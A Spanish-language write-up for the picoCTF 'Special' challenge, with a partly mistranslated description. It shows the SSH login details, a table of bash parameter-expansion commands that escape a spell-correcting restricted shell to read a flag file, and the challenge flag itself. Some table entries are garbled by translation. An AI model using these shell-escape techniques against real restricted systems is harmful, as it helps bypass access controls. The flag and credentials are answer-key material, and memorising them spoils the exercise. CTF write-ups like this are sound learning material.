## Reto: Special
### Descripción
¿No se cansan los usuarios avanzados de cometer errores ortográficos en el caparazón? No ¡ya! Ingrese Especial, la Interfaz Comprobada por Hechizo para Afectar Linux. Ahora, cada palabra está correctamente escrita y capitalizada... automáticamente y ¡tras bastidores! Sé el primero en probar Special en beta, y siéntete libre de decirlo todos nosotros sobre cómo Special agiliza cada proceso de desarrollo que enfrenta. Cuando sus compañeros de trabajo vean su increíble interfaz de shell, solo dígales: Eso es Especial (TM)Inicie su instancia para ver los detalles de la conexión.`ssh -p 64990 ctf-player@saturn.picoctf.net`La contraseña es `fd7746b4`
### Solución

Primero nos conectamos por medio de los comandos proporcionados:
```ssh
ssh -p 64990 ctf-player@saturn.picoctf.net
```

```password
fd7746b4
```

Durante un muy buen tiempo, utilizamos varias formas de poder acceder al shell y poder entenderlo, pero no lo logramos. Tuvimos que recorrer a internet, la pagina nos proporcionaba la siguiente tabla con los comandos que teníamos que ejecutar.

| Comando                            |            Salida             |
| :--------------------------------- | :---------------------------: |
| ¿${parámetro?ls}                   |         parámetro: ls         |
| ${:ls}                             |       Mala sustitución        |
| ${parameter=ls}                    |            blargh             |
| ${parameter=cat blargh}            | cat: blargh: Es un directorio |
| ${parameter=cd blargh}             |    ${parameter=cd blargh}     |
| ${parameter=ls blargh}             |          bandera.txt          |
| ${parameter=cat < blargh/flag.txt} |    Esto le dio la bandera     |

Una vez que ejecutamos cada uno de esos comandos. Obtenemos la bandera

```flag
picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59}
```


### Notas adicionales
Al buscar y navegar por internet, me encontré una pagina que decía que ejecutando el comando entre paréntesis, podríamos hacerlo funcionar también, esto es cierto, pero es estar jugando con los comandos
### Referencias

Kimiri, J. (2023, 12 mayo). Pico CTF (Special). _J053’s Blog_. https://josephkimiri.github.io/posts/Special/ 